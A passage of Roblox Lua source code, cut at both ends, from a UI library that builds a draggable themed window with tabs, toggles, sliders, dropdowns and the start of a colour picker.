			items = { };
		}

		local StarterGUI = game.Players.LocalPlayer.PlayerGui;
		local CoreGui = game:FindFirstChild("CoreGui");
		local textservice = game:GetService("TextService");
		local httpservice = game:GetService("HttpService");

		library.theme = {
		BackGround = Color3.fromRGB(8, 8, 8);
		BackGround2 = Color3.fromRGB(12, 12, 12);
		Border = Color3.fromRGB(0, 0, 0);
		Toggle = Color3.fromRGB(20, 20, 20);
		Selected = Color3.fromRGB(0, 180, 255);
		Font = Enum.Font.RobotoMono;          -- ← changed here
		TextSize = 12;
		TextColor = Color3.fromRGB(255, 255, 255);
	};

		function library:CreateWindow(Keybind, Name)
			local window = { };
			window.keybind = Keybind or Enum.KeyCode.RightShift;
			window.name = Name or "@ gg./publicxenemy";

			window.ScreenGui = Instance.new("ScreenGui");
			window.ScreenGui.Parent = (CoreGui or StarterGUI);
			window.ScreenGui.ResetOnSpawn = false;
			window.ScreenGui.DisplayOrder = 10;

			local dragging, dragInput, dragStart, startPos
			game:GetService("UserInputService").InputChanged:Connect(function(input)
				if input == dragInput and dragging then
					local delta = input.Position - dragStart
					window.Main.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
				end
			end)

			local dragstart = function(input)
				if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
					dragging = true
					dragStart = input.Position
					startPos = window.Main.Position

					input.Changed:Connect(function()
						if input.UserInputState == Enum.UserInputState.End then
							dragging = false
						end
					end)
				end
			end

			local dragend = function(input)
				if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
					dragInput = input
				end
			end

						-- MAIN WINDOW
			window.Main = Instance.new("TextButton", window.ScreenGui);
			window.Main.Size = UDim2.fromOffset(780, 380);
			window.Main.BackgroundColor3 = library.theme.BackGround;
			window.Main.BorderSizePixel = 1;
			window.Main.BorderColor3 = library.theme.Border;
			window.Main.Active = true;
			window.Main.AutoButtonColor = false;
			window.Main.Text = "";
			window.Main.InputBegan:Connect(dragstart)
			window.Main.InputChanged:Connect(dragend)

			local mainCorner = Instance.new("UICorner", window.Main)
			mainCorner.CornerRadius = UDim.new(0, 16)

			-- RIGHT SIDE PANEL
			window.RightSide = Instance.new("Frame", window.Main);
			window.RightSide.BackgroundColor3 = library.theme.BackGround2;
			window.RightSide.Size = UDim2.fromOffset(220, 380); -- mas malaki para kasya settings
			window.RightSide.Position = UDim2.new(1, -220, 0, 0) -- dikit sa right
			window.RightSide.BorderSizePixel = 0;

			local rightCorner = Instance.new("UICorner", window.RightSide)
			rightCorner.CornerRadius = UDim.new(0, 16)

			-- TABS HOLDER
			window.TabsHolder = Instance.new("Frame", window.Main);
			window.TabsHolder.Position = UDim2.fromScale(0.031, 0.107);
			window.TabsHolder.Size = UDim2.fromOffset(100, 389);
			window.TabsHolder.BackgroundTransparency = 1;

			-- UI LIST
			window.UIListLayout = Instance.new("UIListLayout", window.TabsHolder);
			window.UIListLayout.HorizontalAlignment = Enum.HorizontalAlignment.Center;
			window.UIListLayout.Padding = UDim.new(0, 10);
			window.UIListLayout.SortOrder = Enum.SortOrder.LayoutOrder;

			-- DIVIDER LINE
			window.line = Instance.new("Frame", window.Main);
			window.line.Position = UDim2.fromScale(0.188, 0);
			window.line.Size = UDim2.fromOffset(1, 250);
			window.line.BorderSizePixel = 0;
			window.line.BackgroundColor3 = library.theme.Border;

			local lineCorner = Instance.new("UICorner", window.line)
			lineCorner.CornerRadius = UDim.new(0, 6)

			-- TITLE
			window.Title = Instance.new("TextLabel", window.Main);
			window.Title.Size = UDim2.new(1, 0, 0, 40)
			window.Title.Position = UDim2.new(0, 0, 0, 0)
			window.Title.BackgroundTransparency = 1
			window.Title.Text = window.name
			window.Title.Font = library.theme.Font
			window.Title.TextSize = 19
			window.Title.TextColor3 = library.theme.TextColor
			window.Title.TextXAlignment = Enum.TextXAlignment.Center
			window.Title.TextYAlignment = Enum.TextYAlignment.Center

			local fontFace = window.Title.FontFace
			fontFace.Weight = Enum.FontWeight.Bold
			window.Title.FontFace = fontFace

			local titleCorner = Instance.new("UICorner", window.Title)
			titleCorner.CornerRadius = UDim.new(0, 10)


			game:GetService("UserInputService").InputBegan:Connect(function(key)
				if key.KeyCode == window.keybind then
					window.Main.Visible = not window.Main.Visible
				end
			end)

			window.Tabs = { };
			window.OpenedColorPickers = { };
			
			function window:UpdateKeyBind(Key)
				window.keybind = Key;
			end

			function window:CreateToggleButton()
				local ToggleButton = { };

				ToggleButton.Frame = Instance.new("Frame", window.ScreenGui);
				ToggleButton.Frame.Size = UDim2.fromOffset(141, 38);
				ToggleButton.Frame.Position = UDim2.fromScale(0.466, 0.15);
				ToggleButton.Frame.Draggable = true;
				ToggleButton.Frame.Active = true;
				ToggleButton.Frame.BackgroundColor3 = library.theme.BackGround;
				ToggleButton.Frame.BorderSizePixel = 1;
				ToggleButton.Frame.BorderColor3 = library.theme.Border;

				ToggleButton.Button = Instance.new("TextButton", ToggleButton.Frame);
				ToggleButton.Button.Size = UDim2.fromOffset(141, 26);
				ToggleButton.Button.Position = UDim2.fromScale(0, 0.316);
				ToggleButton.Button.Text = "Close";
				ToggleButton.Button.TextColor3 = library.theme.TextColor;
				ToggleButton.Button.Font = library.theme.Font;
				ToggleButton.Button.TextSize = library.theme.TextSize;
				ToggleButton.Button.BackgroundColor3 = library.theme.BackGround2;
				ToggleButton.Button.BorderSizePixel = 0;
				ToggleButton.Button.BorderColor3 = library.theme.Border;
				ToggleButton.Button.MouseButton1Click:Connect(function()
					window.Main.Visible = not window.Main.Visible;
					ToggleButton.Button.Text = window.Main.Visible and "Close" or not window.Main.Visible and "Open"
				end)

				game:GetService("UserInputService").InputBegan:Connect(function(key)
					if key.KeyCode == window.keybind then
						ToggleButton.Button.Text = window.Main.Visible and "Close" or "Open"
					end
				end)

				function ToggleButton:Update(Bool)
					ToggleButton.Frame.Visible = Bool;
				end

				ToggleButton.Frame.BackgroundTransparency = 1
				ToggleButton.Frame.BorderSizePixel = 0
				ToggleButton.Button.BackgroundTransparency = 1
				ToggleButton.Button.TextTransparency = 1

				return ToggleButton;
			end

			function window:CreateTab(Name) -- Fuck You No ScrollingFrame
				local tab = { };

				tab.Button = Instance.new("TextButton", window.TabsHolder);
				tab.Button.Size = UDim2.fromOffset(137, 33);
				tab.Button.BackgroundColor3 = library.theme.BackGround;
				tab.Button.Text = Name;
				tab.Button.TextColor3 = library.theme.TextColor;
				tab.Button.Font = library.theme.Font;
				tab.Button.TextSize = library.theme.TextSize;
				tab.Button.BorderSizePixel = 0;

				tab.Window = Instance.new("ScrollingFrame", window.Main);
				tab.Window.Name = Name .. "Tab";
				tab.Window.BackgroundTransparency = 1;
				tab.Window.Visible = false;
				tab.Window.Size = UDim2.fromOffset(600, 380);
				tab.Window.Position = UDim2.fromOffset(150, 0);
				tab.Window.ScrollBarThickness = 0;

				tab.Left = Instance.new("Frame", tab.Window);
				tab.Left.Size = UDim2.fromOffset(90, 360);
				tab.Left.Position = UDim2.fromOffset(120, 18);
				tab.Left.BackgroundTransparency = 1;

				tab.UiListLayout = Instance.new("UIListLayout", tab.Left);
				tab.UiListLayout.HorizontalAlignment = Enum.HorizontalAlignment.Center;
				tab.UiListLayout.Padding = UDim.new(0, 7);
				tab.UiListLayout.SortOrder = Enum.SortOrder.LayoutOrder;

				tab.Right = Instance.new("Frame", tab.Window);
				tab.Right.Size = UDim2.fromOffset(90, 360);
				tab.Right.Position = UDim2.fromOffset(430, 18);
				tab.Right.BackgroundTransparency = 1;

				tab.UiListLayout1 = Instance.new("UIListLayout", tab.Right);
				tab.UiListLayout1.HorizontalAlignment = Enum.HorizontalAlignment.Center;
				tab.UiListLayout1.Padding = UDim.new(0, 7);
				tab.UiListLayout1.SortOrder = Enum.SortOrder.LayoutOrder;

				local block = false;
				function tab:SelectTab()
					repeat 
						wait();
					until block == false

					block = true;
					for i,v in pairs(window.Tabs) do
						if v ~= tab or v.ClassName ~= "TextLabel" then
							v.Button.BackgroundColor3 = library.theme.BackGround;
							v.Button.Name = "";
							v.Window.Visible = false;
						end
					end

					tab.Button.BackgroundColor3 = library.theme.Selected;
					tab.Button.Name = "";
					tab.Window.Visible = true;
					block = false;
				end

				if #window.Tabs == 0 then
					tab:SelectTab();
				end

				tab.Button.MouseButton1Down:Connect(function()
					tab:SelectTab();
				end)

				tab.SectorsLeft = { };
				tab.SectorsRight = { };

				function tab:CreateSector(Name, Side)
					local Sector = { };
					Sector.side = Side:lower() or "left"
					Sector.name = Name or ""

					Sector.Main = Instance.new("Frame", Sector.side == "left" and tab.Left or tab.Right);
					Sector.Main.BackgroundColor3 = library.theme.BackGround2;
					Sector.Main.BorderSizePixel = 0;
					Sector.Main.Name = Sector.name:gsub(" ", "") .. "Sector";
					Sector.Main.Size = UDim2.fromOffset(230, 50);

					Sector.UICorner = Instance.new("UICorner", Sector.Main);
					Sector.UICorner.CornerRadius = UDim.new(0, 9);

					Sector.Items = Instance.new("Frame", Sector.Main);
					Sector.Items.Position = UDim2.fromScale(0.434, 0);
					Sector.Items.Size = UDim2.fromOffset(34 , 50);
					Sector.Items.AutomaticSize = Enum.AutomaticSize.Y;
					Sector.Items.BackgroundTransparency = 1;

					Sector.UIListLayout = Instance.new("UIListLayout", Sector.Items);
					Sector.UIListLayout.SortOrder = Enum.SortOrder.LayoutOrder;
					Sector.UIListLayout.HorizontalAlignment = Enum.HorizontalAlignment.Center;
					Sector.UIListLayout.Padding = UDim.new(0,7);

					Sector.Name = Instance.new("TextLabel", Sector.Items);
					Sector.Name.BackgroundTransparency = 1;
					Sector.Name.Size = UDim2.fromOffset(20, 20);
					Sector.Name.Text = Name;
					Sector.Name.TextColor3 = library.theme.TextColor;
					Sector.Name.Font = library.theme.Font;
					Sector.Name.TextSize = library.theme.TextSize;
					Sector.Name.TextYAlignment = Enum.TextYAlignment.Bottom;

					Sector.Divider = Instance.new("Frame", Sector.Items);
					Sector.Divider.Size = UDim2.fromOffset(230, 2);
					Sector.Divider.BorderSizePixel = 0;
					Sector.Divider.BackgroundColor3 = library.theme.BackGround;

					table.insert(Sector.side:lower() == "left" and tab.SectorsLeft or tab.SectorsRight, Sector);

					function Sector:FixSize()
						Sector.Main.Size = UDim2.fromOffset(250, Sector.UIListLayout.AbsoluteContentSize.Y + 12);
						local sizeleft, sizeright = 0, 0;
						for i,v in pairs(tab.SectorsLeft) do
							sizeleft = sizeleft + v.Main.AbsoluteSize.Y;
						end
						for i,v in pairs(tab.SectorsRight) do
							sizeright = sizeright + v.Main.AbsoluteSize.Y;
						end
						tab.Window.CanvasSize = (sizeleft > sizeright and UDim2.fromOffset(650, sizeleft + 100) or UDim2.fromOffset(650, sizeright + 100))
					end

					function Sector:CreateToggle(Text, Defult, Callback, Flag)
						local Toggle = { };
						Toggle.text = Text or "";
						Toggle.default = Defult or false;
						Toggle.callback = Callback or function(value) end;
						Toggle.flag = Flag or Text or "";

						Toggle.value = Toggle.default;

						Toggle.Main = Instance.new("TextButton", Sector.Items);
						Toggle.Main.Size = UDim2.fromOffset(240, 35);
						Toggle.Main.BackgroundColor3 = library.theme.BackGround;
						Toggle.Main.AutoButtonColor = false;
						Toggle.Main.Text = "";

						Toggle.UICorner = Instance.new("UICorner", Toggle.Main);
						Toggle.UICorner.CornerRadius = UDim.new(0, 8);

						Toggle.Text = Instance.new("TextLabel", Toggle.Main);
						Toggle.Text.Position = UDim2.fromScale(0.046, 0);
						Toggle.Text.Size = UDim2.fromOffset(125, 35);
						Toggle.Text.Text = Text;
						Toggle.Text.TextColor3 = library.theme.TextColor;
						Toggle.Text.Font = library.theme.Font;
						Toggle.Text.TextSize = library.theme.TextSize;
						Toggle.Text.BackgroundTransparency = 1;
						Toggle.Text.TextXAlignment = Enum.TextXAlignment.Left;


						Toggle.Indicator = Instance.new("Frame", Toggle.Main);
						Toggle.Indicator.Position = UDim2.fromScale(0.875, 0.229);
						Toggle.Indicator.Size = UDim2.fromOffset(18, 18);
						Toggle.Indicator.BackgroundColor3 = library.theme.Toggle;
						Toggle.Indicator.BorderSizePixel = 0;

						if Toggle.flag and Toggle.flag ~= "" then
							library.flags[Toggle.flag] = Toggle.default or false;
						end

						function Toggle:Set(value) 
							if value then
								Toggle.Indicator.BackgroundColor3 = library.theme.Selected;
							else
								Toggle.Indicator.BackgroundColor3 = library.theme.Toggle;
							end

							Toggle.value = value
							Toggle.Indicator.BackgroundColor3 = (value and library.theme.Selected or library.theme.Toggle);
							if Toggle.flag and Toggle.flag ~= "" then
								library.flags[Toggle.flag] = Toggle.value;
							end
							pcall(Toggle.callback, value);
						end

						Toggle.Main.MouseButton1Down:Connect(function()
							Toggle:Set(not (Toggle.Indicator.BackgroundColor3 == library.theme.Selected and true or Toggle.Indicator.BackgroundColor3 == library.theme.Toggle and false));
						end)

						Toggle:Set(Toggle.default)
						Sector:FixSize();
						table.insert(library.items, Toggle);
						return Toggle;
					end

					function Sector:CreateSlider(Text, Min, Defult, Max, Decimals, Callback, Flag)
						local Slider = { };
						Slider.text = Text or "";
						Slider.callback = Callback or function(value) end;
						Slider.min = Min or 0;
						Slider.max = Max or 100;
						Slider.decimals = Decimals or 1;
						Slider.default = Defult or Slider.min;
						Slider.flag = Flag or Text or "";

						Slider.value = Slider.default;
						local dragging = false;

						Slider.Mainback = Instance.new("Frame", Sector.Items);
						Slider.Mainback.Size = UDim2.fromOffset(240, 35);
						Slider.Mainback.BackgroundColor3 = library.theme.BackGround;
						Slider.Mainback.BorderSizePixel = 0;

						Slider.UICorner = Instance.new("UICorner", Slider.Mainback);
						Slider.UICorner.CornerRadius = UDim.new(0, 8);

						Slider.Text = Instance.new("TextLabel", Slider.Mainback);
						Slider.Text.Position = UDim2.fromScale(0.046, 0);
						Slider.Text.Size = UDim2.fromOffset(125, 35);
						Slider.Text.Text = Text;
						Slider.Text.TextColor3 = library.theme.TextColor;
						Slider.Text.Font = library.theme.Font;
						Slider.Text.TextSize = library.theme.TextSize;
						Slider.Text.BackgroundTransparency = 1;
						Slider.Text.TextXAlignment = Enum.TextXAlignment.Left;

						Slider.Main = Instance.new("TextButton", Slider.Mainback);
						Slider.Main.BackgroundColor3 = library.theme.Toggle;
						Slider.Main.Text = "";
						Slider.Main.Position = UDim2.fromScale(0.533, 0.229);
						Slider.Main.Size = UDim2.fromOffset(100, 18);
						Slider.Main.BorderSizePixel = 0;
						Slider.Main.AutoButtonColor = false;

						Slider.Slider = Instance.new("Frame", Slider.Main);
						Slider.Slider.BackgroundColor3 = library.theme.Selected;
						Slider.Slider.BorderSizePixel = 0;
						Slider.Slider.Position = UDim2.fromScale(0, 0);
						Slider.Slider.Size = UDim2.fromOffset(50, 18);

						Slider.OutPutText = Instance.new("TextLabel", Slider.Main);
						Slider.OutPutText.Position = UDim2.fromScale(0, 0);
						Slider.OutPutText.Size = UDim2.fromOffset(100, 18);
						Slider.OutPutText.BackgroundTransparency = 1;
						Slider.OutPutText.Font = library.theme.Font;
						Slider.OutPutText.TextColor3 = library.theme.TextColor;
						Slider.OutPutText.TextSize = library.theme.TextSize;
						Slider.OutPutText.Text = Slider.value;

						if Slider.flag and Slider.flag ~= "" then
							library.flags[Slider.flag] = Slider.default or Slider.min or 0;
						end

						function Slider:Get()
							return Slider.value;
						end

						function Slider:Set(value)
							Slider.value = math.clamp(math.round(value * Slider.decimals) / Slider.decimals, Slider.min, Slider.max);
							local percent = 1 - ((Slider.max - Slider.value) / (Slider.max - Slider.min));
							if Slider.flag and Slider.flag ~= "" then
								library.flags[Slider.flag] = Slider.value;
							end
							Slider.Slider:TweenSize(UDim2.fromOffset(percent * Slider.Main.AbsoluteSize.X, Slider.Main.AbsoluteSize.Y), Enum.EasingDirection.In, Enum.EasingStyle.Sine, 0.07);
							Slider.OutPutText.Text = Slider.value;
							pcall(Slider.callback, Slider.value);
						end

						Slider:Set(Slider.default);

						function Slider:Refresh()
							local mousePos = game.Workspace.CurrentCamera:WorldToViewportPoint(game.Players.LocalPlayer:GetMouse().Hit.p);
							local percent = math.clamp(mousePos.X - Slider.Slider.AbsolutePosition.X, 0, Slider.Main.AbsoluteSize.X) / Slider.Main.AbsoluteSize.X;
							local value = math.floor((Slider.min + (Slider.max - Slider.min) * percent) * Slider.decimals) / Slider.decimals;
							value = math.clamp(value, Slider.min, Slider.max);
							Slider:Set(value);
						end

						Slider.Slider.InputBegan:Connect(function(input)
							if input.UserInputType == Enum.UserInputType.MouseButton1 then
								dragging = true;
								Slider:Refresh();
							end
						end)

						Slider.Slider.InputEnded:Connect(function(input)
							if input.UserInputType == Enum.UserInputType.MouseButton1 then
								dragging = false;
							end
						end)

						Slider.Main.InputBegan:Connect(function(input)
							if input.UserInputType == Enum.UserInputType.MouseButton1 then
								dragging = true;
								Slider:Refresh();
							end
						end)

						Slider.Main.InputEnded:Connect(function(input)
							if input.UserInputType == Enum.UserInputType.MouseButton1 then
								dragging = false;
							end
						end)

						game:GetService("UserInputService").InputChanged:Connect(function(input)
							if dragging and input.UserInputType == Enum.UserInputType.MouseMovement then
								Slider:Refresh();
							end
						end)

						Sector:FixSize();
						table.insert(library.items, Slider);

						return Slider;
					end

					function Sector:CreateDropDown(Text, Items, Default, Multichoice, Callback, Flag)
						local DropDown = { };	
						DropDown.text = Text or "";
						DropDown.defaultitems = Items or { };
						DropDown.default = Default;
						DropDown.callback = Callback or function() end;
						DropDown.multichoice = Multichoice or false;
						DropDown.values = { };
						DropDown.flag = Flag or Text or "";

						DropDown.MainBack = Instance.new("TextButton", Sector.Items);
						DropDown.MainBack.BackgroundColor3 = library.theme.BackGround;
						DropDown.MainBack.AutoButtonColor = false;
						DropDown.MainBack.Size = UDim2.fromOffset(240, 35);
						DropDown.MainBack.Text = "";

						DropDown.UICorner = Instance.new("UICorner", DropDown.MainBack);
						DropDown.UICorner.CornerRadius = UDim.new(0,8);

						DropDown.TextLabel = Instance.new("TextLabel", DropDown.MainBack);
						DropDown.TextLabel.Text = DropDown.text;
						DropDown.TextLabel.BackgroundTransparency = 1;
						DropDown.TextLabel.TextColor3 = library.theme.TextColor;
						DropDown.TextLabel.TextSize = library.theme.TextSize;
						DropDown.TextLabel.Font = library.theme.Font;
						DropDown.TextLabel.Size = UDim2.fromOffset(125, 35);
						DropDown.TextLabel.Position = UDim2.fromScale(0.046, 0);
						DropDown.TextLabel.TextXAlignment = Enum.TextXAlignment.Left;

						DropDown.Main = Instance.new("TextButton", DropDown.MainBack);
						DropDown.Main.BackgroundColor3 = library.theme.Toggle;
						DropDown.Main.BorderSizePixel = 0;
						DropDown.Main.Position = UDim2.fromScale(0.496, 0.229);
						DropDown.Main.Size = UDim2.fromOffset(109, 18);
						DropDown.Main.TextSize = library.theme.TextSize;
						DropDown.Main.TextColor3 = library.theme.TextColor;
						DropDown.Main.Font = library.theme.Font;
						DropDown.Main.AutoButtonColor = false;
						DropDown.Main.Text = "";

						DropDown.SelectedLable = Instance.new("TextLabel", DropDown.Main);
						DropDown.SelectedLable.Position = UDim2.fromOffset(0,0);
						DropDown.SelectedLable.Size = UDim2.fromOffset(108, 18);
						DropDown.SelectedLable.BackgroundTransparency = 1;
						DropDown.SelectedLable.TextSize = library.theme.TextSize;
						DropDown.SelectedLable.TextColor3 = library.theme.TextColor;
						DropDown.SelectedLable.Font = library.theme.Font;
						DropDown.SelectedLable.Text = DropDown.text;

						DropDown.Arrow = Instance.new("TextLabel", DropDown.Main);
						DropDown.Arrow.Position = UDim2.fromScale(0.826,0);
						DropDown.Arrow.Size = UDim2.fromOffset(18, 18);
						DropDown.Arrow.BackgroundTransparency = 1;
						DropDown.Arrow.TextSize = library.theme.TextSize;
						DropDown.Arrow.TextColor3 = library.theme.TextColor;
						DropDown.Arrow.Font = library.theme.Font;
						DropDown.Arrow.Text = "<";
						DropDown.Arrow.Rotation = -90;

						DropDown.Itemsframe = Instance.new("ScrollingFrame", DropDown.Main);
						DropDown.Itemsframe.BorderSizePixel = 0;
						DropDown.Itemsframe.BackgroundColor3 = library.theme.BackGround;
						DropDown.Itemsframe.Position = UDim2.fromOffset(0, DropDown.Main.Size.Y.Offset + 8);
						DropDown.Itemsframe.ScrollBarThickness = 2;
						DropDown.Itemsframe.ZIndex = 8;
						DropDown.Itemsframe.ScrollingDirection = "Y";
						DropDown.Itemsframe.Visible = false;
						DropDown.Itemsframe.CanvasSize = UDim2.fromOffset(DropDown.Main.AbsoluteSize.X, 0);

						DropDown.UIList = Instance.new("UIListLayout", DropDown.Itemsframe);
						DropDown.UIList.FillDirection = Enum.FillDirection.Vertical;
						DropDown.UIList.SortOrder = Enum.SortOrder.LayoutOrder;

						DropDown.IgnoreBackButtons = Instance.new("TextButton", DropDown.Main);
						DropDown.IgnoreBackButtons.BackgroundTransparency = 1;
						DropDown.IgnoreBackButtons.BorderSizePixel = 0;
						DropDown.IgnoreBackButtons.Position = UDim2.fromOffset(0, DropDown.Main.Size.Y.Offset + 8);
						DropDown.IgnoreBackButtons.Size = UDim2.new(0, 0, 0, 0);
						DropDown.IgnoreBackButtons.ZIndex = 7;
						DropDown.IgnoreBackButtons.Text = "";
						DropDown.IgnoreBackButtons.Visible = false;
						DropDown.IgnoreBackButtons.AutoButtonColor = false;

						if DropDown.flag and DropDown.flag ~= "" then
							library.flags[DropDown.flag] = DropDown.multichoice and { DropDown.default or DropDown.defaultitems[1] or "" } or (DropDown.default or DropDown.defaultitems[1] or "");
						end

						function DropDown:isSelected(item)
							for i, v in pairs(DropDown.values) do
								if v == item then
									return true;
								end
							end
							return false;
						end

						function DropDown:GetOptions()
							return DropDown.values;
						end

						function DropDown:updateText(text)
							if #text >= 27 then
								text = text:sub(1, 25) .. "..";
							end
							DropDown.SelectedLable.Text = text;
						end

						DropDown.Changed = Instance.new("BindableEvent");
						function DropDown:Set(value)
							if type(value) == "table" then
								DropDown.values = value;
								DropDown:updateText(table.concat(value, ", "));
								pcall(DropDown.callback, value);
							else
								DropDown:updateText(value);
								DropDown.values = { value };
								pcall(DropDown.callback, value);
							end

							DropDown.Changed:Fire(value)
							if DropDown.flag and DropDown.flag ~= "" then
								library.flags[DropDown.flag] = DropDown.multichoice and DropDown.values or DropDown.values[1];
							end
						end

						function DropDown:Get()
							return DropDown.multichoice and DropDown.values or DropDown.values[1];
						end

						DropDown.items = { }
						function DropDown:Add(v)
							local Item = Instance.new("TextButton", DropDown.Itemsframe);
							Item.BackgroundColor3 = library.theme.Toggle;
							Item.TextColor3 = library.theme.TextColor;
							Item.BorderSizePixel = 0;
							Item.Position = UDim2.fromOffset(0, 0);
							Item.Size = UDim2.fromOffset(180, 20);
							Item.BackgroundTransparency = 0;
							Item.ZIndex = 9;
							Item.Text = v;
							Item.Name = v;
							Item.AutoButtonColor = false;
							Item.Font = library.theme.Font;
							Item.TextSize = library.theme.TextSize;
							Item.TextXAlignment = Enum.TextXAlignment.Left;

							Item.MouseButton1Down:Connect(function()
								if DropDown.multichoice then
									if DropDown:isSelected(v) then
										for i2, v2 in pairs(DropDown.values) do
											if v2 == v then
												table.remove(DropDown.values, i2);
											end
										end
										DropDown:Set(DropDown.values);
									else
										table.insert(DropDown.values, v);
										DropDown:Set(DropDown.values);
									end

									return
								else
									DropDown.Itemsframe.Visible = false;
									DropDown.Itemsframe.Active = false;
									DropDown.IgnoreBackButtons.Visible = false;
									DropDown.IgnoreBackButtons.Active = false;
								end

								DropDown:Set(v)
								return
							end)

							game:GetService("RunService").RenderStepped:Connect(function()
								if DropDown.multichoice and DropDown:isSelected(v) or DropDown.values[1] == v then
									Item.BackgroundColor3 = library.theme.Selected;
									Item.Text = v;
								else
									Item.BackgroundColor3 = library.theme.BackGround2;
									Item.Text = v;
								end
							end)

							table.insert(DropDown.items, v);
							DropDown.Itemsframe.Size = UDim2.fromOffset(DropDown.Main.Size.X.Offset, math.clamp(#DropDown.items * Item.AbsoluteSize.Y, 20, 156) + 4);
							DropDown.Itemsframe.CanvasSize = UDim2.fromOffset(DropDown.Itemsframe.AbsoluteSize.X, (#DropDown.items * Item.AbsoluteSize.Y) + 4);

							DropDown.IgnoreBackButtons.Size = DropDown.Itemsframe.Size;
						end

						function DropDown:Remove(value)
							local item = DropDown.Itemsframe:FindFirstChild(value);
							if item then
								for i,v in pairs(DropDown.items) do
									if v == value then
										table.remove(DropDown.items, i);
									end
								end

								DropDown.Itemsframe.Size = UDim2.fromOffset(DropDown.Main.Size.X.Offset, math.clamp(#DropDown.items * item.AbsoluteSize.Y, 20, 156) + 4);
								DropDown.Itemsframe.CanvasSize = UDim2.fromOffset(DropDown.Itemsframe.AbsoluteSize.X, (#DropDown.items * item.AbsoluteSize.Y) + 4);

								DropDown.IgnoreBackButtons.Size = DropDown.Itemsframe.Size;

								item:Remove();
							end
						end 

						for i,v in pairs(DropDown.defaultitems) do
							DropDown:Add(v);
						end

						if DropDown.default then
							DropDown:Set(DropDown.default);
						end

						local MouseButton1Down = function()
							if not DropDown.Itemsframe.Visible then
								if DropDown.items and #DropDown.items ~= 0 then
									DropDown.Arrow.Rotation = 90;
									DropDown.Itemsframe.ScrollingEnabled = true;
									DropDown.Itemsframe.Visible = true;
									DropDown.Itemsframe.Active = true;
									DropDown.IgnoreBackButtons.Visible = true;
									DropDown.IgnoreBackButtons.Active = true;
								end
							else
								DropDown.Arrow.Rotation = -90;
								DropDown.Itemsframe.ScrollingEnabled = false;
								DropDown.Itemsframe.Visible = false;
								DropDown.Itemsframe.Active = false;
								DropDown.IgnoreBackButtons.Visible = false;
								DropDown.IgnoreBackButtons.Active = false;
							end
						end

						DropDown.MainBack.MouseButton1Down:Connect(MouseButton1Down)
						DropDown.Main.MouseButton1Down:Connect(MouseButton1Down)

						Sector:FixSize();
						table.insert(library.items, DropDown);
						return DropDown;
					end

					function Sector:CreateColorPicker(Text, Defult, CallBack, Flag) -- I Know This Is Shit But I Will Make A Better One Later.
						local ColorPicker = { };

						ColorPicker.callback = CallBack or function() end;
						ColorPicker.default = Defult or Color3.fromRGB(255, 255, 255);
						ColorPicker.value = ColorPicker.default;
						ColorPicker.flag = Flag or (Text or "");

						ColorPicker.MainBack = Instance.new("TextButton", Sector.Items);
						ColorPicker.MainBack.BackgroundColor3 = library.theme.BackGround;
						ColorPicker.MainBack.AutoButtonColor = false;
						ColorPicker.MainBack.Size = UDim2.fromOffset(240, 35);
						ColorPicker.MainBack.Text = "";

						ColorPicker.UiCorner = Instance.new("UICorner", ColorPicker.MainBack);
						ColorPicker.UiCorner.CornerRadius = UDim.new(0, 8);
						
						ColorPicker.Indicator = Instance.new("Frame", ColorPicker.MainBack);
						ColorPicker.Indicator.Position = UDim2.fromScale(0.875, 0.229);
						ColorPicker.Indicator.Size = UDim2.fromOffset(18, 18);
						ColorPicker.Indicator.BackgroundColor3 = ColorPicker.default;
						ColorPicker.Indicator.BorderSizePixel = 0;

						ColorPicker.TextLabel = Instance.new("TextLabel", ColorPicker.MainBack);
						ColorPicker.TextLabel.Text = Text;
						ColorPicker.TextLabel.BackgroundTransparency = 1;
						ColorPicker.TextLabel.TextColor3 = library.theme.TextColor;
						ColorPicker.TextLabel.TextSize = library.theme.TextSize;
						ColorPicker.TextLabel.Font = library.theme.Font;
						ColorPicker.TextLabel.Size = UDim2.fromOffset(125, 35);
						ColorPicker.TextLabel.Position = UDim2.fromScale(0.046, 0);
						ColorPicker.TextLabel.TextXAlignment = Enum.TextXAlignment.Left;

						ColorPicker.MainPicker = Instance.new("TextButton", ColorPicker.MainBack);
						ColorPicker.MainPicker.Name = "";
						ColorPicker.MainPicker.ZIndex = 100;
						ColorPicker.MainPicker.Visible = false;
						ColorPicker.MainPicker.AutoButtonColor = false;
						ColorPicker.MainPicker.Text = "";
						ColorPicker.MainPicker.Size = UDim2.fromOffset(180, 196);
						ColorPicker.MainPicker.BorderSizePixel = 0;
						ColorPicker.MainPicker.BackgroundColor3 = Color3.fromRGB(40, 40, 40);
						ColorPicker.MainPicker.Rotation = 0.000000000000001;
						ColorPicker.MainPicker.Position = UDim2.fromOffset(-ColorPicker.MainPicker.AbsoluteSize.X + ColorPicker.MainBack.AbsoluteSize.X, 17);
						window.OpenedColorPickers[ColorPicker.MainPicker] = false;
						
						ColorPicker.hue = Instance.new("ImageLabel", ColorPicker.MainPicker);
						ColorPicker.hue.ZIndex = 101;
						ColorPicker.hue.Position = UDim2.new(0,3,0,3);
						ColorPicker.hue.Size = UDim2.new(0,172,0,172);
						ColorPicker.hue.Image = "rbxassetid://4155801252";
						ColorPicker.hue.ScaleType = Enum.ScaleType.Stretch;
						ColorPicker.hue.BackgroundColor3 = Color3.new(1,0,0);
						ColorPicker.hue.BorderColor3 = library.theme.Border;
						
						ColorPicker.hueselectorpointer = Instance.new("ImageLabel", ColorPicker.MainPicker);
						ColorPicker.hueselectorpointer.ZIndex = 101;
						ColorPicker.hueselectorpointer.BackgroundTransparency = 1;
						ColorPicker.hueselectorpointer.BorderSizePixel = 0;
						ColorPicker.hueselectorpointer.Position = UDim2.new(0, 0, 0, 0);
						ColorPicker.hueselectorpointer.Size = UDim2.new(0, 7, 0, 7);
						ColorPicker.hueselectorpointer.Image = "rbxassetid://6885856475";
						
						ColorPicker.selector = Instance.new("TextLabel", ColorPicker.MainPicker);
						ColorPicker.selector.ZIndex = 100;
						ColorPicker.selector.Position = UDim2.new(0,3,0,181);
						ColorPicker.selector.Size = UDim2.new(0,173,0,10);
						ColorPicker.selector.BackgroundColor3 = Color3.fromRGB(255,255,255);
						ColorPicker.selector.BorderColor3 = library.theme.Border;
						ColorPicker.selector.Text = "";
						
						ColorPicker.gradient = Instance.new("UIGradient", ColorPicker.selector);
						ColorPicker.gradient.Color = ColorSequence.new({ 
